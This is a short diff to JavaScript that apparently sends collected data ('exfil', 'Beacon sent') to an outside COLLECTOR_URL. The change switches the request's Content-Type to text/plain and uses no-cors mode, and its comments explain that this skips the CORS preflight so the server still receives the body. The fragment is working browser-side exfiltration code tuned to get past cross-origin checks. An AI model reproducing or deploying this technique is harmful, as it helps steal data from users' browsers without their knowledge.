@@ -179,9 +179,9 @@
 
     fetch(COLLECTOR_URL, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: { "Content-Type": "text/plain" }, // text/plain is CORS-safelisted; JSON body still arrives
       body: payloadStr,
-      mode: "no-cors"   // no-cors so CORS preflight doesn't block; server receives body
+      mode: "no-cors"   // no-cors — no preflight needed; server receives body regardless of CORS response headers
     }).then(function() {
       exfilStatus.textContent = "✓ Beacon sent to " + COLLECTOR_URL +
                                 " at " + new Date().toISOString();
